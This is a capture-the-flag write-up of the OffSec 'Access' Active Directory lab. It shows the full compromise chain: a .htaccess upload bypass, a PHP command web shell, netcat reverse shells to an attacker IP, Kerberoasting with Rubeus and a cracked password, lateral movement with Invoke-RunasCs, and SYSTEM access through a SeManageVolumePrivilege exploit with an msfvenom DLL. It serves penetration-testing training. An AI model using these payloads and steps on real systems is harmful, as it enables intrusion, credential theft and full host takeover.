##### Tags: `AD`  `.htaccess`  `rebeus`  `Kerberoasting`  `Invoke-RunasCs.ps1`  `SeManageVolumePrivilege`

# 🪟 Access (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.236.187

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-09 11:24:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-Ft-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-Ft-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
this is a active directory machine, many ports are opening  
port 53 is dns but unable to connect  
port 135,139,445 are rpc and smb unable to connect  
port 80 and 443 are the same webpage, there is a buy tickets upload box  
gobuster found there is a /upload page for the file that we uploaded
```console
$ gobuster dir -u http://192.168.236.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -b 302,404 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.236.187
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   302,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Uploads              (Status: 301) [Size: 344] [--> http://192.168.236.187/Uploads/]
```
when we try to upload a php reverse shell it says not allowed
```console
This file extension is not allowed !!
```
we try to upload a .htaccess file to make the extension allowed to be uploaded on the webpage call .evil
```console
$ cat .htaccess
AddType application/x-httpd-php .evil
```
then we make a simple cmd php shell name shell.evil
```console
$ cat shell.evil
<pre>
<?php
system($_GET['cmd']);
?>
</pre>
```
upload both to the buy ticket box  
and we got RCE to get the reverse shell  
```console
http://192.168.236.187/uploads/shell.evil?cmd=nc.exe -e cmd.exe 192.168.45.224 443
```
we are svc_apache
```console
$ penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 192.168.45.224
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from SERVER 192.168.236.187 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 access\svc_apache • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/SERVER~192.168.236.187-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_09-21_58_55-100.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\xampp\htdocs\uploads>whoami
access\svc_apache
```
## lateral movement
there is another user call svc_mssql
```console
C:\xampp\htdocs\uploads>net users
net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
```
we comfirmed it is a SPN account 
```console
PS C:\Users\svc_apache\Desktop> Get-netuser svc_mssql

serviceprincipalname          : MSSQLSvc/DC.access.offsec
givenname                     : MSSQL
usnchanged                    : 73754
lastlogon                     : 4/8/2022 2:40:02 AM
badpwdcount                   : 1
cn                            : MSSQL
msds-supportedencryptiontypes : 0
objectsid                     : S-1-5-21-537427935-490066102-1511301751-1104
primarygroupid                : 513
pwdlastset                    : 5/21/2022 5:33:45 AM
name                          : MSSQL
```
upload rebeus.exe to use Kerberoasting to dump the hash of svc_mssql
```console
C:\Users\svc_apache\Desktop>.\Rubeus.exe kerberoast /user:svc_mssql /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_mssql
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 12:33:45 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$CEE7F97756E06B24CE96C0EC16F166B3$91EB9C8C99028531CFB5B5828D827B4A44DE5565DCD08493C2BDD7BC4A049290936399696BC287F128D1A54651C5B407EC2842C5DF04FC0D205EBBDEAA9DBC0877F5EBF86D5A112728E6D3FC8DF51758FF6386C9389234621A736C0F4F08002076E481494A0929F4DB2C8B38EF98A5147484A1CB2201E68200DA58FB617505683EA566D384A7B047F28C84F7FA07F1A8B682BD2815C5BF874D96EE0CC99FE09780823224EA5FBA5985D20E63098A3CBED23BC2A2B5A79461FB2E46DA01A95B40E1D28345CA9BC0A34B5DB2D6DDBF61497355C4642DA03FFEAC263B43E0A1507B9FDDFB3146D84588AF9CAD5224D2AB9F14F4CC7C9930142CBD61CE7D3454E57486B49392B3983B769DDFFD349179EAA41C405B175DD7B946FF7046D89F9BB476CAC6218F11C004E7D13185D9DFBB2A3BB4B8B879E0BB8B941721581BA59E013DEE4DFF316954008A7705963A801D481637BC5C8DF1D80505252BDCCF23D6D5C117728FD6FE1F559A99008AD94AD6D0B8FEB601E46D1D6F967534CA9CD94779EF3108D724EF6FBD26A19140FBC7714006BFDBDAFA102F15281C27549E081FD74CFFB9B22D4CC36A204245798C460A850E636DA5BC1EBA788D5A57B8367F3E90E95D2D2BD6A468C90A9FE5E0E342046576594FA4700BB531B3DEB04ECC86A745115B1065C2BC0C309524A15D5D72A95F906B3D094D7933C6004986A21E3AB653EEC46C3AC60F35B3584D25F66BEC32A0001C6D71AE9B706430000F732FF3ECF4639F9AA75265C4E7328A9CD36125F5870FA1884C928AC2C22D59862C068ACD168BDFC63168DCA37CC96BD917FAFBC79EB05A4A1EB148B127ECFB9A22049F870213450655AAD9BEE9B9AAC8F5E6522840EDD2252C6EC0EC5ED8AB24AC99473DF31A6578235D0D4E4759C1CA27B576DA2179E4985D774763FDF1D40E01AF6F973C98FA8B6E50A856680DFA538DFCAEC6C077E74B61CA333B72F1ACE373CE2DA20B8AB3726B484C5998DB87CD35ED6D63F091691323ECB4D5D6704195B17537DE62E41DFD0C99B5E93A0241BB952BCCA27ED3F5F9A8A9391D58538AE692FBE43696D38C6D91155F8C62CBADCD7ED07E7F3B3E692322FFC64A0010428B26CD6EA2DAB7932C59217483FB07C0D75B76B990D048F9838C3708A8C069EDD907C75DA9F176CF1F4F40CBBF6DD1EDF37A712E782DC98BF501617CC7ABC38157FB633AF7C070054B1E9CDE632EF49A88EBD7B35E2ACCE6C87CE6D76D695F9BC3BD3472B910D19E6943C2592A0DCC400065B070786BE115FE3458A943BF0146C790EFE00E590C455277A7588FA1EC5563AE99C64A3024CE24A98CA51C516F52A02E3B39378A92F86804DF794F361632ADA774F40A1D76E30537281D205AAE9CC716799CCC8EEA44544C2CF1190ECBBEE016755D7BEE852A4CEB4EF416B41F0E54FA093F10F0ED4FBC9A38B746AE495498A081ECC9B5F87AB69C15F89F14089E320FDCBB1331012001F063A6438B40F19721784EB2CD451AB6EEC4E04756BF402DB4E96CADBD146AF471EDA399299D8A7230B55D573410409F868D1CDE3900404136957879111EC23347A27DEBC94F66E86BF62433CAE74949
```
crack the hash 
```console
$ hashcat -m 13100 1.txt /home/ming/Downloads/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting

trustno1
```
the account is unable to login via winrm even the port is opening
```console
$ netexec winrm 192.168.162.187 -u 'svc_mssql' -p 'trustno1'

WINRM       192.168.162.187 5985   SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:access.offsec)
WINRM       192.168.162.187 5985   SERVER           [-] access.offsec\svc_mssql:trustno1
```
as we know the username and password  
we can use Invoke-RunasCs.ps1 to to run command as the user svc_mssql
```console
powershell
Import-module .\Invoke-RunasCs.ps1
```
confirmed we have RCE
```console
PS C:\Users\svc_apache\Desktop> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
access\svc_mssql
```
get the reverse shell of svc_mssql
```console
PS C:\Users\public\Downloads> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "nc.exe -e cmd.exe 192.168.45.224 445"
```
```console
$ penelope -p 445
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 10.0.2.15 • 192.168.45.224
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from access.offsec 192.168.236.187 WINDOWS 👤 access\svc_mssql • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/access.offsec~192.168.236.187-WINDOWS/2026_04_09-23_25_35-432.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
access\svc_mssql
```
## Privilege Escalation
we have SeManageVolumePrivilege  
we can abuse this can escalate to system  
https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/semanagevolumeprivilege
```console
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```
```console
	1. SeManageVolumeExploit.exe to victim machine
 
	2. C:\Users\svc_mssql\Desktop>.\SeManageVolumeExploit.exe
	Entries changed: 922
	DONE 
	
	3. icacls C:\Windows\System32\spool\drivers\x64\3\
	
	4. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.224 LPORT=389 -f dll -o Printconfig.dll

	5. Upload the dll file and copy it to C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
```
trigger it
```console
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
	
$object = [Activator]::CreateInstance($type)
```
got the system shell
```console
$ penelope -p 389 
[+] Listening for reverse shells on 0.0.0.0:389 →  127.0.0.1 • 10.0.2.15 • 192.168.45.224
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from access.offsec 192.168.236.187 WINDOWS 👤 nt authority\system • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/access.offsec~192.168.236.187-WINDOWS/2026_04_09-23_51_32-620.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
nt authority\system
```
